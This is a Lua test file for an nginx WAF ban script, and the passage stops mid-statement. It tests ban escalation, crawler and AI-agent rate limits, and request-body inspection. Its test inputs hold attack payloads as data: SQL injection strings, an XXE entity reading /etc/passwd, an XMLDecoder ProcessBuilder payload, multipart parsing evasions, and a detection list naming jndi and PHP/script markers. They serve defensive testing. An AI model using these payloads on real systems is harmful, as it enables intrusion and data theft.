-- Run config/waf-ban.lua against a stub ngx, one rewrite and one log phase per request, as nginx does.
local script = arg[0]:gsub("[^/]*$", "") .. "../config/waf-ban.lua"

local now = 0
local strikes_store = {}
local bans_store = {}
local bans_hooks = {}
local function make_dict(store, hooks)
	return {
		get = function(_, k)
			local e = store[k]
			return e and (not e.exp or e.exp > now) and e.v or nil
		end,
		set = function(_, k, v, ttl)
			if hooks and hooks.fail_set then
				return false, hooks.fail_set
			end
			store[k] = { v = v, exp = ttl and now + ttl }
			return true
		end,
		add = function(self, k, v, ttl)
			if hooks and hooks.before_add then
				hooks.before_add(k)
			end
			if hooks and hooks.fail_add then
				return false, hooks.fail_add
			end
			if self:get(k) ~= nil then
				return false, "exists"
			end
			store[k] = { v = v, exp = ttl and now + ttl }
			return true
		end,
		delete = function(_, k)
			store[k] = nil
		end,
		incr = function(self, k, n, init, ttl)
			local v = self:get(k)
			if v == nil then
				store[k] = { v = init + n, exp = ttl and now + ttl }
			else
				store[k].v = v + n
			end
			return store[k].v
		end,
	}
end
local strikes_dict = make_dict(strikes_store)
local bans_dict = make_dict(bans_store, bans_hooks)
local stats_store = {}
local stats_dict = make_dict(stats_store)
local logs_emitted = {}

localized_global = {
	WAF_URI_Request_table = {
		{ "^.*$", [[/xmlrpc\.php]] },
		{ [[^https://other\.example/.*$]], "/private/" },
		{ "^.*$", "/MATCHLIMIT/" },
	},
	WAF_query_string_Request_table = {
		{ "^.*$", ".*union.*" },
		{ "order", ".*;.*" },
		{ "^.*$", ".*MATCHLIMIT.*" },
		{ "^.*$", '.*"#.*' },
		{ "^.*$", ".*esc[\f\b\n]esc.*" },
	},
	WAF_body_block = true,
	WAF_body_skip = { "^/wp%-admin/post%.php$" },
	WAF_cookie_block = true,
	WAF_cookie_skip = { "^sl%-session$" },
}
local temps = {}

local EXIT = {}
package.loaded["waf_ban_cache"] = {}

local function re_find(s, p)
	if p:find("MATCHLIMIT", 1, true) and s:find("boom", 1, true) then
		return nil, nil, "pcre2_match() failed: -47"
	end
	if p:find("doctype", 1, true) then
		for _, w in ipairs({ "<!doctype", "<!entity", "class=", "<?php", "${jndi", "<script" }) do
			if s:lower():find(w, 1, true) then
				return 1
			end
		end
		return nil
	end
	return s:lower():find((p:gsub("%(%?i%)", ""):gsub("\\%.", "%%."):lower()))
end

local function run()
	local ok, err = pcall(dofile, script)
	if not ok and err ~= EXIT then
		error(err, 0)
	end
end

local function start(ip, opts)
	opts = opts or {}
	local ctx, exited, cleared, header = {}, nil, {}, {}
	local function env(phase, status)
		_G.ngx = {
			shared = { waf_strikes = strikes_dict, waf_bans = bans_dict, waf_stats = stats_dict },
			var = {
				remote_addr = ip,
				realip_remote_addr = not opts.realip_nil and (opts.realip or ip) or nil,
				upstream_status = opts.upstream,
				http_user_agent = opts.ua,
				scheme = "https",
				host = opts.host or "example.com",
				request_uri = opts.raw or opts.uri or "/",
				uri = opts.uri or "/",
				content_type = opts.ctype,
				http_cookie = opts.cookie,
				content_length = opts.body and not opts.chunked and tostring(#opts.body) or nil,
			},
			re = {
				find = function(...)
					return re_find(...)
				end,
			},
			decode_args = function(s, max)
				local t, n = {}, 0
				for pair in s:gmatch("[^&]+") do
					n = n + 1
					if n > max then
						break
					end
					local k, eq, v = pair:match("^([^=]*)(=?)(.*)$")
					v = eq == ""
						or v:gsub("%+", " "):gsub("%%(%x%x)", function(h)
							return string.char(tonumber(h, 16))
						end)
					if t[k] == nil then
						t[k] = v
					elseif type(t[k]) == "table" then
						table.insert(t[k], v)
					else
						t[k] = { t[k], v }
					end
				end
				return t
			end,
			unescape_uri = function(s)
				return (
					s:gsub("%+", " "):gsub("%%(%x%x)", function(h)
						return string.char(tonumber(h, 16))
					end)
				)
			end,
			header = header,
			HTTP_TOO_MANY_REQUESTS = 429,
			STDERR = 0,
			req = {
				is_internal = function()
					return opts.internal == true
				end,
				read_body = function() end,
				get_body_data = function()
					return not opts.file and opts.body or nil
				end,
				get_body_file = function()
					if opts.file and opts.body then
						local path = os.tmpname()
						local f = assert(io.open(path, "wb"))
						f:write(opts.body)
						f:close()
						table.insert(temps, path)
						return path
					end
				end,
				clear_header = function(h)
					cleared[h] = true
				end,
				get_uri_args = function()
					return opts.args or {}, opts.truncated == "args" and "truncated" or nil
				end,
				get_headers = function()
					return opts.headers or {}, opts.truncated == "headers" and "truncated" or nil
				end,
			},
			ctx = ctx,
			status = status,
			HTTP_FORBIDDEN = 403,
			ERR = 4,
			WARN = 5,
			get_phase = function()
				return phase
			end,
			exit = function(code)
				exited = code
				error(EXIT)
			end,
			log = function(level, ...)
				local parts = { ... }
				for i = 1, #parts do
					parts[i] = tostring(parts[i])
				end
				logs_emitted[#logs_emitted + 1] = { level = level, msg = table.concat(parts) }
			end,
		}
	end
	if not opts.site_return then
		env("rewrite")
		run()
		if not exited and not opts.site_deny then
			package.loaded["waf_ban_cache"].upstream = function()
				if opts.status == 403 and not opts.autoindex and not opts.upstream then
					ngx.exit(403)
				end
			end
			env("access")
			run()
		end
	end
	local status = exited or opts.status or 200
	return status,
		function()
			if opts.error_page_444 and status == 403 then
				ctx = {}
				status = 444
			end
			env("log", status)
			run()
		end,
		cleared,
		header
end

local function request(ip, opts)
	local status, log, cleared, header = start(ip, opts)
	log()
	return status, cleared, header
end

local failed = 0
local function check(ok, msg)
	if not ok then
		failed = failed + 1
		print("FAIL " .. msg)
	end
end

local pub = "203.0.113.10"
for i = 1, 4 do
	check(request(pub, { status = 403 }) == 403, "WAF hit " .. i .. " is not passed through as 403")
end
check(request(pub) == 200, "4 WAF hits must not ban")
check(request(pub, { status = 403 }) == 403, "5th WAF hit is not 403")
check(request(pub) == 403, "5 WAF hits within the window must ban")
now = now + 3599
check(request(pub) == 403, "ban must last 1 hour")
now = now + 2
check(request(pub) == 200, "ban must end after 1 hour")
for _, hours in ipairs({ 2, 4, 8, 16 }) do
	for _ = 1, 5 do
		request(pub, { status = 403 })
	end
	now = now + hours * 3600 - 1
	check(request(pub) == 403, "repeat ban must last " .. hours .. " hours")
	now = now + 2
	check(request(pub) == 200, "repeat ban must end after " .. hours .. " hours")
end

local slow = "203.0.113.11"
for _ = 1, 4 do
	request(slow, { status = 403 })
end
now = now + 601
request(slow, { status = 403 })
check(request(slow) == 200, "hits spread over more than 10 minutes must not ban")

local dspace = "203.0.113.12"
for _ = 1, 10 do
	request(dspace, { status = 403, upstream = "403" })
end
check(request(dspace) == 200, "403 from DSpace must not count")

local site = "203.0.113.13"
for _ = 1, 10 do
	request(site, { status = 403, site_return = true })
end
check(request(site) == 200, "403 from a site 'return 403' before the rewrite handler must not count")

for _, ip in ipairs({ "192.168.19.7", "10.1.2.3", "172.16.15.230", "172.31.0.1", "127.0.0.1", "::1", "fd00::1" }) do
	for _ = 1, 10 do
		request(ip, { status = 403 })
	end
	check(request(ip) == 200, "private address " .. ip .. " must never be banned")
end
for _ = 1, 5 do
	request("172.32.0.1", { status = 403 })
end
check(request("172.32.0.1") == 403, "172.32.0.1 is public and must be banned")

local _, cleared = request("203.0.113.20", { realip = "192.168.19.7" })
check(cleared["X-Forwarded-For"], "X-Forwarded-For must be cleared when realip replaced the address")
_, cleared = request("203.0.113.21")
check(not cleared["X-Forwarded-For"], "X-Forwarded-For must stay when realip did not replace the address")
_, cleared = request("203.0.113.22", { realip = "172.68.10.1" })
check(
	cleared["X-Forwarded-For"] and cleared["CF-Connecting-IP"],
	"X-Forwarded-For and CF-Connecting-IP must be cleared when realip replaced the address"
)
_, cleared = request("203.0.113.23", { realip_nil = true })
check(next(cleared) == nil, "no proxy header may be cleared without the realip module")
_, cleared = request("192.168.19.7", { realip = "192.168.19.7" })
check(
	cleared["CF-Connecting-IP"] and not cleared["X-Forwarded-For"],
	"a private proxy address must lose CF-Connecting-IP and keep X-Forwarded-For"
)

local listing = "203.0.113.24"
for _ = 1, 10 do
	request(listing, { status = 403, autoindex = true })
end
check(request(listing) == 200, "a content-phase 403 after upstream passed, such as autoindex off, must not count")
local trap = "203.0.113.25"
for _ = 1, 5 do
	request(trap, { status = 403, site_deny = true })
end
check(request(trap) == 403, "an access-phase deny before upstream must count toward a ban")

local burst = "203.0.113.26"
local logs = {}
for i = 1, 10 do
	local _, log = start(burst, { status = 403 })
	logs[i] = log
end
for _, log in ipairs(logs) do
	log()
end
check(bans_store["bans:" .. burst].v == 1, "one HTTP/2 burst of 10 hits must ban once, not twice")
check(bans_store["bans:" .. burst].exp ~= nil, "the ban history must expire")
check(
	strikes_store["ban:" .. burst] == nil and strikes_store["bans:" .. burst] == nil,
	"bans must live in waf_bans, not waf_strikes"
)
local above = "203.0.113.27"
strikes_store["hit:" .. above] = { v = 7, exp = now + 600 }
request(above, { status = 403 })
check(request(above) == 403, "a hit count already above the limit must still ban")
local repeat_ip = "203.0.113.28"
bans_store["bans:" .. repeat_ip] = { v = 20, exp = now + 2592000 }
for _ = 1, 5 do
	request(repeat_ip, { status = 403 })
end
now = now + 512 * 3600 - 1
check(request(repeat_ip) == 403, "a repeat ban must last up to its 512-hour cap")
now = now + 2
check(request(repeat_ip) == 200, "a repeat ban must end after its 512-hour cap")

local raced = "203.0.113.90"
for _ = 1, 4 do
	request(raced, { status = 403 })
end
logs_emitted = {}
bans_hooks.before_add = function(k)
	bans_store[k] = { v = true, exp = now + 3600 }
	bans_store["bans:" .. raced] = { v = 1, exp = now + 3600 + 2592000 }
end
request(raced, { status = 403 })
bans_hooks.before_add = nil
check(bans_store["bans:" .. raced].v == 1, "concurrent worker winning ban:add must not increment bans twice")
check(#logs_emitted == 0, "losing worker in ban:add race must not emit duplicate ban log")

local oom_ip = "203.0.113.91"
for _ = 1, 4 do
	request(oom_ip, { status = 403 })
end
logs_emitted = {}
bans_hooks.fail_add = "no memory"
request(oom_ip, { status = 403 })
bans_hooks.fail_add = nil
check(bans_store["bans:" .. oom_ip] == nil, "failed ban:add due to no memory must not increment ban history")
check(strikes_store["hit:" .. oom_ip] ~= nil, "failed ban:add must keep hit counter intact")
check(
	#logs_emitted == 1 and logs_emitted[1].level == 4 and logs_emitted[1].msg:find("no memory", 1, true),
	"failed ban:add must log an ERR instead of a false ban WARN"
)

local persistent = "203.0.113.92"
for step = 1, 10 do
	for _ = 1, 5 do
		request(persistent, { status = 403 })
	end
	now = now + 3600 * 2 ^ (step - 1) + 1
end
for _ = 1, 5 do
	request(persistent, { status = 403 })
end
now = now + 512 * 3600 - 1
check(request(persistent) == 403, "11th consecutive ban past 30 days must stay at 512 hours, not reset to 1 hour")
now = now + 2 + 2592000
for _ = 1, 5 do
	request(persistent, { status = 403 })
end
now = now + 3601
check(request(persistent) == 200, "ban history must reset to 1 hour after 30 quiet days past the last ban")

bans_store["ban:" .. repeat_ip] = { v = true, exp = now + 3600 }
local banned_status, banned_cleared = request(repeat_ip, { realip = "192.168.19.7" })
check(banned_status == 403 and next(banned_cleared) == nil, "banned IP must exit immediately before header clearing")

-- Crawlers, AI agents, and Turnitin are not banned for a few payload hits, e.g. links planted with SQLi; the 403 itself stays.
-- 50 payload hits within 10 minutes ban them, because anyone can send a crawler User-Agent; a generic HTTP client is banned at 5.
now = now + 3600
local crawler_n = 0
for _, crawler in ipairs({
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Turnitin (https://bit.ly/2UvnfoQ)",
	"Mozilla/5.0 (compatible; PlagyBot/1.0)",
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 (compatible; meta-externalagent/1.1 (+https://developers.facebook.com/docs/sharing/webmasters/crawler))",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Claude-User/1.0; +claude-user@anthropic.com)",
}) do
	crawler_n = crawler_n + 1
	local addr = "203.0.113." .. (80 + crawler_n)
	for _ = 1, 10 do
		request(addr, { ua = crawler, status = 403 })
	end
	check(request(addr, { ua = crawler }) ~= 403, "crawler was banned for 10 payload hits: " .. crawler)
end
local patient = "203.0.113.70"
local patient_ua = "Mozilla/5.0 (compatible; PlagyBot/1.0)"
for _ = 1, 49 do
	request(patient, { ua = patient_ua, status = 403 })
end
check(request(patient, { ua = patient_ua }) == 200, "49 crawler payload hits must not ban")
request(patient, { ua = patient_ua, status = 403 })
check(request(patient, { ua = patient_ua }) == 403, "50 crawler payload hits within 10 minutes must ban")
local spread = "203.0.113.71"
for _ = 1, 49 do
	request(spread, { ua = patient_ua, status = 403 })
end
now = now + 601
request(spread, { ua = patient_ua, status = 403 })
check(request(spread, { ua = patient_ua }) == 200, "crawler payload hits spread over more than 10 minutes must not ban")
for _, client in ipairs({ "curl/8.5.0", "python-requests/2.32.3" }) do
	local addr = client:sub(1, 4) == "curl" and "203.0.113.41" or "203.0.113.42"
	for _ = 1, 5 do
		request(addr, { ua = client, status = 403 })
	end
	check(request(addr, { ua = client }) == 403, "generic client with 5 payload hits must be banned: " .. client)
end

-- AI agents share one budget per agent family across all addresses, answered with 429, which never counts toward a ban.
local chatgpt =
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot"
local claude =
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Claude-User/1.0; +claude-user@anthropic.com)"
local browser = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
now = now + 3600
for i = 1, 10 do
	check(
		request("203.0.113.30", { ua = chatgpt }) == 200,
		"ChatGPT-User request " .. i .. " within the limit was refused"
	)
end
local status, _, header = request("203.0.113.31", { ua = chatgpt })
check(status == 429, "11th ChatGPT-User request in a minute, from another address, must get 429")
check(header["Retry-After"] == 60, "429 must carry Retry-After: 60")
check(request("203.0.113.30", { ua = claude }) == 200, "Claude-User must have its own budget")
for _ = 2, 10 do
	request("203.0.113.30", { ua = claude })
end
check(request("203.0.113.30", { ua = claude }) == 429, "11th Claude-User request in a minute must get 429")
check(request("203.0.113.30", { ua = browser }) == 200, "a browser on the same address must not be limited")
for _ = 1, 20 do
	request("203.0.113.32", { ua = chatgpt })
end
check(request("203.0.113.32", { ua = browser }) == 200, "429 from the AI limit must not count toward a ban")
now = now + 61
check(request("203.0.113.31", { ua = chatgpt }) == 200, "the AI limit must reset after a minute")
now = now + 61
for i = 1, 10 do
	request("203.0.113.34", { ua = chatgpt })
	check(
		request("203.0.113.34", { ua = chatgpt, internal = true }) == 200,
		"the internal redirect of ChatGPT-User request " .. i .. " must not use the budget"
	)
end
check(request("203.0.113.34", { ua = chatgpt }) == 429, "the 11th external ChatGPT-User request must get 429")
check(
	request("203.0.113.33", { ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" }) == 200,
	"Googlebot is no AI agent"
)

for _, kind in ipairs({ "args", "headers" }) do
	check(request("203.0.113.50", { truncated = kind }) == 403, "more than 100 " .. kind .. " must get 403")
end
for _ = 1, 10 do
	request("203.0.113.51", { truncated = "args" })
end
check(request("203.0.113.51") == 200, "403 for more than 100 args or headers must not count toward a ban")

local encoded = "203.0.113.60"
for i = 1, 5 do
	check(
		request(encoded, { raw = "/xmlrpc%2ephp", uri = "/xmlrpc.php" }) == 403,
		"encoded path hit " .. i .. " that only matches after decoding must get 403"
	)
end
check(request(encoded) == 403, "5 hits on the decoded path must ban")
check(request("203.0.113.61", { uri = "/xmlrpc.html" }) == 200, "a decoded path that matches no rule must pass")
check(request("203.0.113.62", { uri = "/boom" }) == 403, "a regex error on the decoded path must block")
check(request("203.0.113.61", { uri = "/private/x" }) == 200, "a URI rule for another host must not apply")
check(
	request("203.0.113.61", { host = "other.example", uri = "/private/x" }) == 403,
	"a URI rule for this host must apply"
)

local form = "application/x-www-form-urlencoded"
local mp = "multipart/form-data; boundary=XyZ"
local over = string.rep("a", 131073)
local n = 0
local function body(opts)
	n = n + 1
	return request("198.51.100." .. n, opts)
end
local function part(head, value)
	return "--XyZ\r\n" .. head .. "\r\n\r\n" .. value .. "\r\n"
end
local field_q = 'Content-Disposition: form-data; name="q"'
check(body({ ctype = form, body = "q=1+union+select+2" }) == 403, "a urlencoded field with a payload must get 403")
check(body({ ctype = form .. "; charset=UTF-8", body = "q=hello+world" }) == 200, "a clean urlencoded body must pass")
check(body({ ctype = form, body = "order=title;drop" }) == 403, "a rule for the order field must apply to it")
check(body({ ctype = form, body = "q=a;b" }) == 200, "a rule for the order field must not apply to other fields")
check(body({ ctype = form, body = "q=boom" }) == 403, "a regex error must block, not let the body through")
check(body({ ctype = form, body = string.rep("a=1&", 1001) }) == 413, "more than 1000 fields must get 413")
check(body({ ctype = form, body = "q=union", file = true }) == 403, "a body buffered to a temp file must be checked")
check(body({ ctype = form, body = over }) == 413, "a urlencoded body over 128 KB must get 413")
check(body({ ctype = form, body = over, chunked = true }) == 413, "a chunked body over 128 KB must get 413")
check(
	body({ ctype = "application/json", body = '{"q":"un\\u0069on"}' }) == 403,
	"a JSON body must be checked after its \\u escapes are decoded"
)
check(body({ ctype = "application/json", body = '{"q":"hello"}' }) == 200, "a clean JSON body must pass")
check(
	body({ ctype = "application/json", body = '{"color":"#ffffff","n":-1.5e3,"ok":true,"z":null,"e":{},"a":[]}' })
		== 200,
	"JSON values must be checked without the quotes around them"
)
check(
	body({ ctype = "application/json", body = '{"order":"title;drop"}' }) == 403,
	"a rule for a field name must apply to the JSON value of that key"
)
check(
	body({ ctype = "application/json", body = '{"a":["ok",{"q":"x\\"un\\u0069on\\""}]}' }) == 403,
	"a nested JSON string with escapes must be checked"
)
check(body({ ctype = "application/json", body = '{"x union y":1}' }) == 403, "a JSON key with a payload must get 403")
check(
	body({ ctype = "application/json", body = '{"q":"un\\u0069on"' }) == 403,
	"malformed JSON must be checked as one text"
)
check(
	body({ ctype = "application/json", body = '{"q":"#"} "#' }) == 403,
	"JSON with trailing data must be checked as one text"
)
check(
	body({ ctype = "application/json", body = ("["):rep(101) .. '"#"' .. ("]"):rep(101) }) == 413,
	"JSON nested deeper than 100 levels must get 413"
)
check(
	body({ ctype = "application/json", body = ("["):rep(101) .. "1" .. ("]"):rep(101) }) == 413,
	"clean JSON nested deeper than 100 levels must get 413"
)
check(
	body({ ctype = "application/json", body = '{"q":"\\uff55nion"}' }) == 403,
	"JSON fullwidth ASCII \\uff01-\\uff5e escapes must be folded and checked"
)
check(body({ body = over }) == 413, "an untyped body over 128 KB without Content-Type must get 413")
check(
	body({ ctype = "application/json", body = "[" .. ("1,"):rep(1000) .. "1]" }) == 200,
	"JSON with more than 1000 values must be checked as one text, not refused"
)
check(
	body({ ctype = "application/json", body = '["#",' .. ("1,"):rep(1000) .. "1]" }) == 403,
	"JSON with more than 1000 values must still be checked"
)
check(
	body({ ctype = "text/plain", body = "q=union" }) == 200,
	"a body type that PHP and Tomcat do not parse is not checked"
)
check(
	body({ ctype = "application/json", body = '{"q":"esc\\fesc"}' }) == 403
		and body({ ctype = "application/json", body = '{"q":"esc\\besc"}' }) == 403,
	"JSON \\f and \\b escapes must decode to form feed and backspace"
)
check(
	body({ ctype = "application/json", body = '{"q":"esc\\\\nesc"}' }) == 200,
	"an escaped backslash before n must stay a backslash, not become a newline"
)
check(
	body({ ctype = "application/json", body = '{"q":"a\\fb"}' }) == 200
		and body({ ctype = "application/json", body = '{"x union y":{}}' }) == 403
		and body({ ctype = "application/json", body = '{"x union y":{"a":1}}' }) == 403
		and body({ ctype = "application/json", body = '{"x union y":[]}' }) == 403,
	"outer JSON object keys on empty or nested objects/arrays must be checked"
)
check(body({
	ctype = "application/atom+xml",
	body = '<entry xmlns="http://www.w3.org/2005/Atom"><link href="https://example.org/1"/><source><title>ok</title></source><item online="true"/></entry>',
}) == 200, "valid Atom and SOAP XML with <link>, <source>, and online= attributes must pass")
check(
	body({ ctype = "application/xml", body = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a/>' }) == 403,
	"XML body with DOCTYPE/ENTITY XXE must get 403"
)
check(
	body({ ctype = "text/xml", body = '<java><object class="java.lang.ProcessBuilder"/></java>' }) == 403,
	"XMLDecoder payload in XML body must get 403"
)
check(body({ ctype = "application/xml", body = over }) == 413, "an XML body over 128 KB must get 413")
check(
	body({ ctype = "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body = over }) == 200,
	"a binary upload whose type name holds xml must stay unchecked"
)
check(
	body({ ctype = "text/plain", body = '{"q":"1 union select 2"}' }) == 403,
	"a text/plain JSON body with a payload must get 403"
)
check(
	body({ ctype = "text/plain", body = '<!DOCTYPE x [<!ENTITY a "b">]>' }) == 403,
	"a text/plain XML body with XXE must get 403"
)
check(body({ body = '{"q":"union"}' }) == 403, "a JSON body without a Content-Type must be checked")
check(
	body({ ctype = "text/plain", body = over }) == 200,
	"an unstructured text/plain body over 128 KB must stay unchecked"
)
check(request("198.51.100.220", { cookie = "union=1" }) == 403, "a cookie name with a payload must get 403")
check(
	request("198.51.100.221", { cookie = "un%69on=" }) == 403,
	"a percent-encoded cookie name with an empty value must get 403"
)
check(
	body({ ctype = mp, body = part(field_q, "1 union select 2") .. "--XyZ--\r\n" }) == 403,
	"a multipart field with a payload must get 403"
)
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.sql"\r\nContent-Type: text/plain', "union")
		.. "--XyZ--\r\n",
}) == 200, "a multipart file must not be checked")
check(
	body({ ctype = mp, body = part(field_q .. '; xfilename="a"', "union") .. "--XyZ--\r\n" }) == 403,
	"only a filename parameter makes a multipart file, as in PHP"
)
check(
	body({ ctype = mp, body = part(field_q, "union") }) == 403,
	"a last field without a closing boundary must be checked"
)
check(
	body({ ctype = "multipart/form-data; boundary=Other", body = part(field_q, "union") }) == 403,
	"a multipart body whose boundary matches no part must be checked whole"
)
check(body({ ctype = mp, body = over }) == 413, "a multipart body over 128 KB without any part must get 413")
local clean_q = part(field_q, "x") .. "--XyZ--\r\n"
check(
	body({ ctype = 'multipart/form-data; x="boundary=FAKE"; boundary=XyZ', body = clean_q }) == 403,
	"a boundary that PHP and Tomcat read differently (quoted parameter) must get 403"
)
check(
	body({ ctype = "multipart/form-data; x_boundary=FAKE; boundary=XyZ", body = clean_q }) == 403,
	"a boundary that PHP and Tomcat read differently (prefixed parameter) must get 403"
)
check(
	body({ ctype = "multipart/form-data; boundary=XyZ; boundary=b", body = clean_q }) == 403,
	"two boundary parameters must get 403"
)
check(body({
	ctype = "multipart/form-data; boundary=XyZ ",
	body = part('Content-Disposition: form-data; name="order"', "title;drop") .. "--XyZ--\r\n",
}) == 403, "a boundary with trailing spaces must still be parsed and checked")
check(
	body({ ctype = mp .. "; charset=UTF-8", body = clean_q }) == 200,
	"a clean multipart body with more parameters must pass"
)
for _, head in ipairs({
	field_q .. '; x="; filename=a"',
	field_q .. "; x='; filename=a'",
	field_q .. '; x="\\"; filename=a"',
}) do
	check(
		body({ ctype = mp, body = part(head, "union") .. "--XyZ--\r\n" }) == 403,
		"a quoted filename= is no file parameter: " .. head
	)
end
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.pdf"\r\n' .. field_q, "union") .. "--XyZ--\r\n",
}) == 403, "two Content-Disposition headers in one part must get 403")
local pdf = part(
	'Content-Disposition: form-data; name="f"; filename="thesis.pdf"\r\nContent-Type: application/pdf',
	("union "):rep(35000)
)
for _, file in ipairs({ false, true }) do
	local mode = file and "a temp file" or "memory"
	check(
		body({ ctype = mp, body = pdf .. part(field_q, "hello") .. "--XyZ--\r\n", file = file, chunked = file }) == 200,
		"a 200 KB upload with a clean field in " .. mode .. " must pass"
	)
	check(body({
		ctype = mp,
		body = part('Content-Disposition: form-data; name="f"; filename="a.pdf"', ("x"):rep(153600))
			.. part(field_q, "1 union select 2")
			.. "--XyZ--\r\n",
		file = file,
	}) == 403, "a payload after a 150 KB upload in " .. mode .. " must get 403")
	check(body({
		ctype = mp,
		body = part(field_q, "1 union select 2")
			.. part('Content-Disposition: form-data; name="f"; filename="a.pdf"', ("x"):rep(153600))
			.. "--XyZ--\r\n",
		file = file,
	}) == 403, "a payload before a 150 KB upload in " .. mode .. " must get 403")
end
check(
	body({ ctype = mp, body = part('Content-Disposition: form-data; name="pad"', over) .. "--XyZ--\r\n" }) == 413,
	"a non-file field over 128 KB must get 413"
)
check(
	body({ ctype = form, body = "q=union", uri = "/wp-admin/post.php" }) == 200,
	"a body on a skipped path must not be checked"
)
check(
	body({ ctype = form, body = "q=union", internal = true }) == 200,
	"an internal redirect must not check the body again"
)
localized_global.WAF_body_block = false
check(body({ ctype = form, body = "q=union" }) == 200, "log-only mode must not block")
check(body({ ctype = form, body = over }) == 200, "log-only mode must not answer 413")
localized_global.WAF_body_block = true
local attacker = "198.51.100.200"
for _ = 1, 5 do
	request(attacker, { ctype = form, body = "q=union" })
end
check(request(attacker) == 403, "5 body hits must ban")
local big = "198.51.100.201"
for _ = 1, 10 do
	request(big, { ctype = form, body = over })
end
check(request(big) == 200, "413 for a large body must not count toward a ban")

check(
	request("198.51.100.210", { args = { ["x' union select 1,2--"] = true } }) == 403,
	"a query argument name with a payload must get 403"
)
check(request("198.51.100.211", { args = { q = "union" } }) == 200, "query argument values are left to upstream")
check(
	request("198.51.100.212", { args = { union = true }, internal = true }) == 200,
	"an internal redirect must not check argument names again"
)
local named = "198.51.100.213"
for _ = 1, 5 do
	request(named, { args = { union = "1" } })
end
check(request(named) == 403, "5 argument name hits must ban")
check(body({ ctype = form, body = "1+union+select=2" }) == 403, "a urlencoded field name with a payload must get 403")
check(
	body({ ctype = mp, body = part('Content-Disposition: form-data; name="union"', "x") .. "--XyZ--\r\n" }) == 403,
	"a multipart field name with a payload must get 403"
)
check(
	request("198.51.100.214", { cookie = "a=1; q=un%69on" }) == 403,
	"a decoded cookie value with a payload must get 403"
)
check(
	request("198.51.100.215", { cookie = "_ga=GA1.1.123.456; wp-settings-1=libraryContent%3Dbrowse; e=" }) == 200,
	"clean cookies must pass"
)
check(
	request("198.51.100.216", { cookie = "q=union", internal = true }) == 200,
	"an internal redirect must not check cookies again"
)
check(
	request("198.51.100.218", { cookie = "sl-session=union" }) == 200,
	"a cookie in WAF_cookie_skip must not be checked"
)
check(
	request("198.51.100.219", { cookie = "sl-session=x; sl-sessionx=union" }) == 403,
	"a cookie not in WAF_cookie_skip must still be checked"
)
localized_global.WAF_cookie_block = false
check(request("198.51.100.217", { cookie = "q=union" }) == 200, "cookie log-only mode must not block")
check(
	request("198.51.100.217", { cookie = ("a=1;"):rep(201) }) == 200,
	"cookie log-only mode must not block over 200 cookies"
)
localized_global.WAF_cookie_block = true

check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="union"; filename="clean.txt"', "ok") .. "--XyZ--\r\n",
}) == 403, "a multipart file part name with a payload must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="union.txt"', "ok") .. "--XyZ--\r\n",
}) == 403, "a multipart file part filename with a payload must get 403")
check(body({
	ctype = mp,
	body = part("Content-Disposition: form-data; name=\"f\"; filename*=UTF-8''..%2Funion.txt", "ok") .. "--XyZ--\r\n",
}) == 403, "a multipart file part filename* with a payload must get 403")
check(body({
	ctype = mp,
	body = part(
		'Content-Disposition: form-data; name="f"; filename="report.pdf"; filename*=UTF-8\'\'report.pdf',
		"union\0binary"
	) .. "--XyZ--\r\n",
}) == 200, "a valid RFC 6266 upload with filename, filename*, and binary NUL body must pass")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="order"; filename="report;1.pdf"', "ok") .. "--XyZ--\r\n",
}) == 200, "an upload filename must not trigger the sort-column rule on part name order")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.txt"', "x"):rep(101) .. "--XyZ--\r\n",
}) == 413, "more than 100 multipart file parts must get 413")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.txt"', "x"):rep(50) .. part(field_q, "x"):rep(
		951
	) .. "--XyZ--\r\n",
}) == 413, "more than 1000 total multipart parts must get 413")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="q"\r\n filename="a.txt"', "ok") .. "--XyZ--\r\n",
}) == 403, "a folded multipart header must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="a"; name="b"', "ok") .. "--XyZ--\r\n",
}) == 403, "duplicate name parameters in multipart Content-Disposition must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.txt"; filename="b.php"', "ok") .. "--XyZ--\r\n",
}) == 403, "duplicate filename parameters in multipart Content-Disposition must get 403")
check(body({
	ctype = mp,
	body = part("Content-Disposition: form-data; name=\"f\"; filename*=UTF-8''a.txt; filename*=UTF-8''b.txt", "ok")
		.. "--XyZ--\r\n",
}) == 403, "duplicate filename* parameters in multipart Content-Disposition must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; x="unterminated', "ok") .. "--XyZ--\r\n",
}) == 403, "an unterminated quote in multipart Content-Disposition must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a\0.txt"', "ok") .. "--XyZ--\r\n",
}) == 403, "a NUL byte in a multipart part header must get 403")
check(body({
